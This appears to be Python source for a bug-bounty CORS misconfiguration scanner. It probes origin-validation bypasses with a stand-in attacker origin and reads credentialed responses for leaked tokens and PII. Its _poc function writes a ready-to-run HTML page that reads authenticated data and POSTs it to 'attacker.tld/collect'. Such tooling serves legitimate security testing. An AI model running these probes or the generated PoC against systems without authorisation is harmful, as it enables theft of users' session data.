"""CORS misconfiguration scanner — with impact escalation.

Detecting "attacker origin reflected + credentials" is the easy part and on its
own gets closed as informative. This scanner goes the extra step that decides
the payout: it *reads the credentialed cross-origin response* and checks whether
it actually leaks auth tokens, CSRF tokens, or PII — and sets the severity from
that proof. It also probes the common origin-validation bypasses (null origin,
suffix/prefix matching, subdomain trust) so it finds the misconfig in the first
place, and emits a ready-to-run HTML PoC.
"""
from __future__ import annotations

from typing import TYPE_CHECKING
from urllib.parse import urlparse

from core.escalation import sensitive_hits, severity_for

if TYPE_CHECKING:
    from core.orchestrator import Context

EVIL = "https://evil.samaritanx.test"


def _origin_variants(url: str) -> list[tuple[str, str]]:
    """(label, origin) pairs covering reflection + the usual bypass tricks."""
    host = urlparse(url).netloc
    base = host.split(":")[0]
    return [
        ("reflected_arbitrary", EVIL),
        ("null_origin", "null"),
        ("suffix_match", f"https://{base}.evil.samaritanx.test"),
        ("prefix_match", f"https://evilsamaritanx{base}"),
        ("subdomain_trust", f"https://evil.{base}"),
        ("scheme_downgrade", f"http://{base}"),
    ]


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    for label, origin in _origin_variants(url):
        ev = await ctx.http.get(url, headers={"Origin": origin})
        aco = ev.response_headers.get("access-control-allow-origin")
        acc = (ev.response_headers.get("access-control-allow-credentials") or "").lower() == "true"
        if not aco:
            continue

        reflected = (aco == origin) or (origin == "null" and aco == "null")
        wildcard = aco == "*"
        if not reflected and not wildcard:
            continue

        # ----- escalation: what does the readable body actually expose? -----
        hits = sensitive_hits(ev.response_body, ev.response_headers) if (reflected or wildcard) else []
        esc = severity_for(hits)

        if reflected and acc:
            # credentialed cross-origin read of authenticated data
            if esc:
                sev, cvss = esc
                leaked = ", ".join(f"{k} ({s})" for k, s in hits[:4])
                impact = (f"Confirmed exfiltration: an attacker page can read {leaked} "
                          "from the victim's authenticated session cross-origin.")
            else:
                sev, cvss = "medium", 6.1
                impact = ("Credentialed cross-origin read is possible, but no sensitive data "
                          "was observed on this endpoint — re-test against an authenticated, "
                          "data-bearing endpoint to confirm impact.")
            findings.append(_finding(
                url, origin, label, sev, cvss,
                f"ACAO reflected attacker origin via {label} AND ACA-Credentials=true. {impact}",
                hits, poc=_poc(url, credentials=True)))
        elif reflected and not acc:
            # no credentials — only unauthenticated data leaks, unless it carries secrets
            if esc and hits[0][0] in ("jwt", "api_key", "aws_key", "bearer_token"):
                sev, cvss = esc
                msg = f"Endpoint reflects arbitrary origin and the (public) body leaks {hits[0][0]}."
            else:
                sev, cvss = "low", 4.3
                msg = ("Arbitrary origin reflected without credentials — only unauthenticated "
                       "data is exposed cross-origin.")
            findings.append(_finding(url, origin, label, sev, cvss, msg, hits,
                                     poc=_poc(url, credentials=False)))
        elif wildcard and acc:
            findings.append(_finding(
                url, origin, label, "low", 3.7,
                "ACAO=* with credentials=true is browser-blocked but signals insecure intent.",
                hits))
        # stop after the first confirmed credentialed leak
        if findings and findings[-1]["severity"] in ("critical", "high"):
            break
    return findings


def _finding(url, origin, label, sev, cvss, evidence, hits, poc=None):
    f = {
        "category": "cors",
        "title": f"CORS misconfiguration ({label}) — {sev} impact",
        "severity": sev, "cvss": cvss,
        "url": url, "parameter": f"Origin:{origin}",
        "evidence": evidence,
        "request": f"GET {url}\nOrigin: {origin}",
        "metadata": {"bypass": label, "leaked": [k for k, _ in hits]},
    }
    if poc:
        f["poc"] = poc
        f["response"] = poc
    return f


def _poc(url: str, *, credentials: bool) -> str:
    cred = "include" if credentials else "omit"
    return (
        "<!doctype html><script>\n"
        f"fetch('{url}', {{credentials:'{cred}'}})\n"
        "  .then(r => r.text())\n"
        "  .then(d => fetch('https://attacker.tld/collect', "
        "{method:'POST', body:d}));\n"
        "</script>"
    )
